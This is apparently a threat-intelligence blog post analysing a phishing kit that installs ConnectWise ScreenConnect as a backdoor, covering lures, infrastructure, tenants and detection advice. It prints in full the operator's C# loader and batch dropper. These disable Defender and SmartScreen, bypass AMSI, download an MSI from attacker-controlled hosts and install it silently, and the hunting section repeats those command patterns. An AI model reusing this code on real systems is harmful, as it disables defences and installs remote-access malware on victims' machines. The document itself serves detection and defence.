    A trycloudflare-Fronted Kit That Ships ScreenConnect as a Backdoor¶

    Summary¶

    In July 2026 I stumbled upon an open-directory caught by one of my threat infra hunting rules that turned out to be a read-write WebDAV instance hosting, what I like to call, a remote-access abuse kit. Every Windows, macOS and script path in the kit converges on the same product, a persistent, service-installed ConnectWise ScreenConnect client that phones home over TCP 8041 to one of several attacker-controlled tenants. This post walks through the lures, the layered droppers, the small .NET loader, the ScreenConnect installer configuration and the infrastructure that fronts it all.

    Key Takeaways¶

    • Based on the observed evidence, I assess with high confidence that this is a deliberate abuse of a legitimate Remote Monitoring and Management (RMM) product (ConnectWise ScreenConnect, formerly ScreenConnect Control) as a backdoor. The installed payload is the real, WiX-generated ScreenConnect ClientSetup MSI (only the pre-baked launch-parameters point at attacker infrastructure).
    • The operator uses cloudflared.exe (the genuine, code-signed Cloudflare tunnel binary) to expose a WsgiDAV file server at 207.174.0[.]143 as a randomly-named trycloudflare.com sub-domain.
    • The kit provides several delivery chains, spanning a phishing HTML page that redirects to Dropbox, small .NET loader executables, standalone ScreenConnect ClientSetup executables, a macOS .pkg, LNK-inside-ZIP droppers, a VBScript variant using MSXML2/ADODB, and a polished batch script that bypasses AMSI and self-elevates through UAC.

    Where This Started: An Open Directory Behind a Quick-Tunnel¶

    The lead was a URL, hxxps://subscription-magnetic-recommended-meat.trycloudflare[.]com/, that returned a directory listing generated by WsgiDAV 4.3.4 (Figure 1). WsgiDAV is a Python WebDAV implementation where the banner in the response identifies the anonymous user as having read-write access to the root.

    Random-word trycloudflare.com sub-domains are the fingerprint of a Cloudflare "quick tunnel": a one-command tunnel that anyone can raise, without an account, by running cloudflared tunnel --url http://localhost:<port>. Cloudflare assigns the three-or-four-word sub-domain and terminates TLS on their edge, so the origin never appears on the wire. The operator has helpfully staged their copy of cloudflared.exe on the same open directory. It is a legitimate, Cloudflare-signed build (version 2026.6.1), so it will probably not trip antivirus, and the abuse lives entirely in how it is being used, not in what it is.

    Figure 2: Cloudflare-signed build (version 2026.6.1)

    VirusTotal telemetry on the primary ScreenConnect MSI later reveals the origin server behind the tunnel: 207.174.0.143:8080 (Dynu Systems, US), the same address that also hosts the operator's ScreenConnect instance on TCP 8041. In other words, the same box publishes the payloads and receives the RMM check-ins, and the Cloudflare tunnel is a moving-target hostname in front of it. This approach is nothing new and threat actors have been leveraging for quite some time.

    Initial-Access Vector Analysis¶

    Lure Design and Targeting¶

    Even without the original phishing emails, the analysed files paint a consistent picture: broad-spray financial and productivity-app pretexts, cycled to match the season and the language of the recipient. I'll explain this in the sections below.

    The most obvious is zoom-update.html, a fake "Zoom Update Required" page (Figure 3). It carries a Zoom-styled SVG logo, a "Version 6.5.1 includes important security patches" hook and a blue Update Zoom Now call-to-action button linking to hxxps://www.dropbox[.]com/scl/fi/a0hp9g4w2ddkb3ggnkivx/Zoomupdateinstaller.msi?rlkey=rxs41my7pahnx0bfpha0zskyi&st=69oirdr0&dl=1. On page load a JavaScript timer redirects the browser to the same Dropbox URL two seconds later, so a distracted user does not even have to click.

    At this point I still had payloads and loaders but no lure, nothing a target would ever have been asked to open. I was curious whether this whole kit was fed by a phishing wave and, if so, whether the phishing wrapper had ever been submitted to VirusTotal. So I pivoted off of a sibling SystemCheck.msi (SHA-256 5c09aed8c3d0475d076a338c8569526338bfcbdd91679ab26e24a6cf76134aba). Same tenant and same embedded tcp://207.174.0.143:8041/ C2 as the primary MSI on the open directory, and pulled its VirusTotal execution parents view, which lists every file VirusTotal has ever watched drop or launch that MSI on a real endpoint.

    Four entries sat there: two versions of Invoice_Details.pdf.lnk, an Invoice_Details.zip.zip, and 2025_Tax_Transcript.zip, containing a single Invoice_Details.pdf.lnk (Figure 4). The theme is, so to say, loud: it lands in July, three months after United States tax filing, when a "tax transcript" or a follow-up invoice is exactly the sort of unsolicited attachment that a recipient will believe is a real document.

    Delivery Mechanism¶

    The kit is unusually generous in the number of ways it can deliver its final payload, which is always some flavour of the ScreenConnect ClientSetup. In this section I walk through the four chains I actually reproduced, from the point of user interaction to the point where msiexec is invoked. It's worth mentioning that I am still not sure if the threat actor used any other delivery chain apart from the phishing one, but I'll just leave all the options opened.

    The most explicit chain, from the 2025_Tax_Transcript.zip lure, is a five-step story. The user opens the ZIP, sees a document icon named Invoice_Details.pdf.lnk (Windows hides the .lnk), double-clicks it, and control passes to cmd.exe. Reading the LNK's arguments block out of its UTF-16LE bytes gives the whole chain in one line (Figure 5).

    The LNK metadata also leaks its build machine: the machine name is win-livfrvqfmko and the user SID ends in RID 500, which is the built-in local Administrator on a fresh Windows installation. A throwaway VM logged in as Administrator is a very ordinary way for an operator to churn out droppers.

    Once run.bat is fetched and executed, it takes over. It is a single-line PowerShell script wrapped in a batch file (Figure 6). It disables its own window, sets %TEMP%\WindowsUpdate.msi as the destination path, downloads SystemCheck.msi from the same origin, silent-installs it via msiexec /qn /norestart, deletes the MSI, and then bounces Explorer to hide the taskbar flicker.

    The LNK-driven chain is the only one I could reproduce end-to-end, but two additional delivery shapes sit on the open directory in parallel. The first is three tiny .NET loader executables (AdobeReader_Update.exe, lirMkvpf.exe, NYbiLtvO.exe), which are covered in the next section. The second is a pair of standalone ScreenConnect ClientSetup executables (SystemCheck.exe, Document-Viewer.exe) that ship the whole client inside a single self-extracting binary.

    The MemoryLoader.cs .NET Dropper¶

    One of the more useful oversights on the open directory is that the operator left the source code of their .NET loader in place, MemoryLoader.cs. The three small .exe files on the directory are compiled versions of that source. Two of them (AdobeReader_Update.exe and lirMkvpf.exe) share a SHA-256 and are therefore identical builds, while NYbiLtvO.exe differs in exactly one constant: the MSI file name it fetches.

    The behaviour is a compact "Defender blinder plus MSI fetcher". The excerpt below is the important half; it hides the console window, walks a fixed script of Set-MpPreference and Add-MpPreference commands to disable real-time monitoring and add sweeping exclusions, stops and disables the WinDefend service, writes the DisableAntiSpyware policy value into HKLM\SOFTWARE\Policies\Microsoft\Windows Defender, downloads the MSI over the trycloudflare tunnel, and finally bounces Explorer to hide the flicker.

    using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;
using System.Runtime.InteropServices;

class MemoryLoader
{
    // Windows API for hiding windows
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;

    static string MsiFileName = "JqbMljCi.msi";

    static void Main()
    {
        // Hide the console window immediately
        ShowWindow(GetConsoleWindow(), SW_HIDE);

        try
        {
            // Disable Defender (Multiple methods - ALL SILENT)
            RunPowershellSilent("Set-MpPreference -DisableRealtimeMonitoring True -Force");
            RunPowershellSilent("Set-MpPreference -DisableBehaviorMonitoring True -Force");
            RunPowershellSilent("Set-MpPreference -DisableBlockAtFirstSeen True -Force");
            RunPowershellSilent("Add-MpPreference -ExclusionPath 'C:\' -Force");
            RunPowershellSilent("Add-MpPreference -ExclusionExtension '.exe' -Force");
            RunPowershellSilent("Add-MpPreference -ExclusionExtension '.msi' -Force");

            // Stop Defender services - SILENT
            RunCommandSilent("net", "stop WinDefend /y");
            RunCommandSilent("sc", "config WinDefend start= disabled");
            RunCommandSilent("reg", "add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f");

            // Download and install MSI
            DownloadAndInstallMSI();

            // Restart Explorer
            RunCommandSilent("taskkill", "/f /im explorer.exe");
            Thread.Sleep(2000);
            RunCommandSilent("explorer", "");
        }
        catch { }

        // Keep alive
        Thread.Sleep(Timeout.Infinite);
    }

    static void DownloadAndInstallMSI()
    {
        try
        {
            string msiPath = Path.Combine(Path.GetTempPath(), MsiFileName);
            string tunnelUrl = "https://subscription-magnetic-recommended-meat.trycloudflare.com";

            using (WebClient client = new WebClient())
            {
                client.Headers.Add("User-Agent", "Mozilla/5.0");
                client.DownloadFile(tunnelUrl + "/" + MsiFileName, msiPath);
            }

            RunCommandSilent("msiexec", "/i "" + msiPath + "" /qn /norestart /quiet");
            Thread.Sleep(5000);

            if (File.Exists(msiPath)) File.Delete(msiPath);
        }
        catch { }
    }

    static void RunPowershellSilent(string command)
    {
        try
        {
            // Use ProcessStartInfo with all hiding options
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "powershell.exe";
            psi.Arguments = "-Command "" + command + "" -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile";
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = false;
            psi.RedirectStandardError = false;
            psi.LoadUserProfile = false;

            Process process = Process.Start(psi);
            if (process != null)
            {
                process.WaitForExit(15000);
                process.Close();
            }
        }
        catch { }
    }

    static void RunCommandSilent(string fileName, string arguments)
    {
        try
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = fileName;
            psi.Arguments = arguments;
            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = false;
            psi.RedirectStandardError = false;
            psi.LoadUserProfile = false;

            Process process = Process.Start(psi);
            if (process != null)
            {
                process.WaitForExit(15000);
                process.Close();
            }
        }
        catch { }
    }
}

    This loader is not sophisticated. The disabling of Defender's block-at-first-seen cloud lookup (Set-MpPreference -DisableBlockAtFirstSeen True) plus the .msi extension exclusion is what turns the follow-on msiexec call into a silent, uninspected install even on a stock, fully-patched Windows endpoint. That is where the detection value lives: catching that command sequence, not the loader binary itself.

    The MemoryLoader.cs build is compact but rough. VirusTotal shows that the same operator also maintains a much more polished batch-file variant aimed at the same end, silent installation of the ScreenConnect MSI, but through completely different evasion tradecraft, which I walk through in the next section. That polished BAT surfaces as an execution-parent for the primary MSI in VirusTotal's records, alongside the LNK chain from the tax-transcript ZIP. Was MemoryLoader.cs a working file that the threat actor used in an earlier iteration? We will never know.

    The Polished BAT and a Slip of the Tongue¶

    Elsewhere in the operator's fleet, VirusTotal exposes a much more polished batch dropper (SHA-256 31260c37cc442719ac84540f4159dd9d4738575d2ab05e92c751a9b4b5f9b91b) that surfaces as an execution-parent of the same SystemCheck.msi. Its evasion tradecraft overlaps with MemoryLoader.cs but takes a very different tack. Where the .NET loader focused on flattening Defender itself, stopping the service, disabling it, setting the DisableAntiSpyware policy value and excluding the whole C:\ drive plus both .exe and .msi extensions, this batch dropper leaves Defender's realtime engine running and instead attacks the script-level checks around it: it bypasses AMSI by nulling System.Management.Automation.AmsiUtils.amsiInitFailed via reflection, self-elevates through Start-Process '%~f0' -Verb RunAs for the UAC prompt, disables SmartScreen through the registry, strips the Mark-of-the-Web from the downloaded file with Unlock-File, adds a narrow %TEMP% and per-file Defender exclusion, downloads SystemCheck.msi under the innocuous alias WindowsExplorerSupport.msi, and only then hands off to msiexec for the silent install.

    The slip of the tongue is a single line inside the BAT: :: Download ScreenConnect MSI from your RDP. That six-word comment is the reason 207.174.0.143 is publicly identifiable as the operator's own machine and not a compromised third-party host - the operator is describing their own remote-desktop box in the second person while writing the script, and forgot to strip the comment before shipping. It is the single most valuable piece of attribution in the whole kit, and it costs nothing to preserve as a hunting string.

    @echo off
setlocal EnableExtensions EnableDelayedExpansion

:: =============================================
:: AMSI BYPASS (Run before PowerShell)
:: =============================================
powershell -WindowStyle Hidden -Command "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

:: =============================================
:: Auto-elevate to Admin (UAC prompt)
:: =============================================
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: ==============================================
:: Disable Windows SmartScreen
:: ==============================================
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d Off /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1

:: Restart Explorer to apply
taskkill /f /im explorer.exe >nul 2>&1
start explorer.exe >nul 2>&1

:: ================================================
:: Add Defender exclusion for TEMP folder
:: ================================================
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue"

:: ================================================
:: Download ScreenConnect MSI from your RDP
:: ================================================
set "SC_URL=http://207.174.0.143:8080/SystemCheck.msi"
set "SC_PATH=%TEMP%\WindowsExplorerSupport.msi"

powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri '%SC_URL%' -OutFile '%SC_PATH%' -UseBasicParsing"

:: Check if download succeeded
if not exist "%SC_PATH%" (
    echo [ERROR] Download failed. Exiting.
    pause
    exit /b
)

:: Remove Mark-of-the-Web
powershell -WindowStyle Hidden -Command "Unlock-File -Path '%SC_PATH%' -ErrorAction SilentlyContinue"

:: Add exclusion for the MSI file
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%SC_PATH%' -ErrorAction SilentlyContinue"

:: ================================================
:: Silent MSI installation
:: ================================================
msiexec /i "%SC_PATH%" /qn /norestart

:: Clean up
del "%SC_PATH%" >nul 2>&1

exit

    At the time of writing, SystemCheck.msi was still live on the C2 (Figure 7), so any defender can retrieve their own copy and inspect the launch-parameters block directly.

    The ScreenConnect Client and Its Three Tenants¶

    Every path in the kit terminates in the same product: a ConnectWise Control (formerly ScreenConnect) client, either dropped by the MSI installer, packaged inside a self-extracting ScreenConnect.ClientSetup.exe, or bundled as a macOS .app inside a .pkg. The client is legitimate, WiX 3.11-generated, and its native code has been code-signed by ConnectWise's own DigiCert-issued certificate (which is now revoked, as VirusTotal flags with the tag revoked-cert and the INDICATOR_RMM_ConnectWise_ScreenConnect_CERT YARA rule).

    What identifies it as an attacker instance and not a benign IT-support instance is the SERVICE_CLIENT_LAUNCH_PARAMETERS value baked into the MSI's Property table. That value is the exact command-line that the ScreenConnect client uses on first launch, and it contains the host, the port, the base64 RSA session key, and any custom-field campaign labels (Figure 8).

    The h= field identifies the C2, the k= field is the tenant's base64 RSA session key and pins the tenant identity, and each c= field is a custom-field campaign label the operator set when generating this client.

    The two 5.7 MB standalone ScreenConnect ClientSetup binaries (SystemCheck.exe, Document-Viewer.exe) do not need the MSI stage at all; they ship an internal copy of the same MSI and invoke msiexec on it themselves. Document-Viewer.exe is particularly interesting: its embedded launch string points at a wholly different infrastructure host, blog.derrspecial-onlinedmin[.]live:8041 (Figure 9), which resolves to 216.227.218[.]126 at Tier.Net LLC and belongs to a third ScreenConnect tenant (078712a9fb382090). That is our first-and-only look at a domain-based C2 in this kit, as the other two tenants are all straight IP literals.

    We can also note that the k= base64 blob is byte-identical between SystemCheck.exe and the MSI cluster, confirming they belong to the same ScreenConnect tenant.

    The macOS .pkg follows the same pattern for Apple endpoints. It is a xar archive wrapping a cpio payload that lays out /Applications/connectwisecontrol-3e812e5790a876f3.app/, plus a LaunchDaemon and two LaunchAgents (an onlogin and a prelogin variant) for full-session persistence (Figure 10). The tenant string 3e812e5790a876f3 in the bundle identifier is the same tenant used by the Windows MSI cluster, so a compromised Mac reports to exactly the same ScreenConnect instance as a compromised Windows PC.

    Bringing the four MSI variants, the two standalone Windows executables and the macOS .pkg together, the tenant map is what closes the loop. Three distinct ConnectWise Control tenants are in play, and the operator runs several concurrent campaigns tagged with different labels while all landing on those same three tenants. The labels in the last column are the operator's own free-text tags inside their ScreenConnect console, used to sort victims by campaign; they are not the phishing themes as seen by the target.

    Command-and-Control¶

    The client-to-server protocol is native ScreenConnect: an RSA session-key exchange (the k= base64 blob in the launch parameters), followed by a persistent TCP session on either the default port 8041 or an operator-chosen alternative. Every tenant in this kit uses 8041 except the DocumentReview.msi fallback. Traffic from the ScreenConnect client is not obviously malicious in flight; the same protocol is what any legitimate ConnectWise Control managed-service provider would produce.

    The delivery layer, in contrast, deliberately blurs the operator's origin. The WsgiDAV staging server sits on 207.174.0.143:8080 while Cloudflare's edge terminates TLS at subscription-magnetic-recommended-meat.trycloudflare[.]com and proxies to the origin. When one tunnel URL gets blocklisted, the operator raises another with a fresh three-or-four-word name and updates their MSI-generation script; the origin IP does not have to move. VirusTotal's in-the-wild URL history for the primary MSI shows both the tunnel-fronted and the raw-IP versions of the same paths, so the tunnel is a hardening pass rather than the sole entrypoint.

    VirusTotal's in-the-wild URL list also enumerates additional MSI filenames served from the same origin: DOpbYrTg.msi, grZfbHPN.msi, GBYswvFx.msi, VytQTnqo.msi. Those follow the same eight-random-character naming convention as BuYUEVqG and JqbMljCi, so they are almost certainly further session-key variants of the same tenant. Anyone extending this analysis will want to pull those and confirm.

    Detection and Mitigation¶

    If you are defending against this, here is what I would recommend:

    • Alert on any TCP :8041 egress to any of the three known C2 IPs (207.174.0.143, 142.202.191.225, 216.227.218.126), and on any DNS query for a trycloudflare.com sub-domain from a user endpoint. Cloudflare quick-tunnels have essentially no legitimate use on managed corporate laptops (Sigma has ready-made rules for both Cloudflared Tunnels Related DNS Requests and Network Connection Initiated To Cloudflared Tunnels Domains).
    • Add AppLocker or WDAC publisher rules blocking Windows Installer packages whose publisher is ScreenConnect Software unless deployed by IT, and cover the self-extracting ScreenConnect.ClientSetup.exe variant as well. Inventory any host that already has a service named ScreenConnect Client (<16 hex>) and validate the tenant string against the approved list.
    • Hunt for the Defender-blinding sequence (Set-MpPreference -DisableRealtimeMonitoring, Add-MpPreference -ExclusionPath 'C:', sc config WinDefend start= disabled, and HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware = 1) executed within sixty seconds of a small (<10 kB) .NET assembly launched from %USERPROFILE%\Downloads, %USERPROFILE%\Desktop or %TEMP%.
    • Alert on the specific AMSI-bypass reflection string [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed' in a PowerShell command line. That construct is very rare in benign scripts.
    • Hunt for bitsadmin /transfer where the URL argument targets a trycloudflare.com sub-domain or an IP literal ending in .bat. Analogously, hunt for curl -s -o "%TEMP%*.bat" against an IP-literal HTTP source.
    • Sweep for the persistence artefacts. On Windows, any service named ScreenConnect Client (<16 hex>) outside your approved tenants, plus the HKCR\sc-<16-hex>\shell\open\command URL handler and the HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\ScreenConnect Client (<16-hex>) safe-boot persistence key. On macOS, the LaunchDaemon and LaunchAgents at /Library/Launch{Daemons,Agents}/connectwisecontrol-*.plist.
    • Block at the email or web gateway ZIP attachments containing .pdf.lnk, .docx.lnk or .xlsx.lnk, and Dropbox direct-download links (?dl=1) from external senders. The tax-transcript ZIP would be blocked by either rule.
    • Report the three tenant identifiers (3e812e5790a876f3, 7f252422820b074c, 078712a9fb382090) to the ConnectWise Trust Center at trust@connectwise.com so the sessions can be revoked at the vendor.

    If a host is already enrolled, assume full compromise: the operator inherits the full ScreenConnect feature set, including remote command execution, file transfer and unattended access. Uninstall the client, purge the persistence keys, rotate any credentials cached or entered on the host during the compromise window, and treat the network segment as needing a lateral-movement sweep.
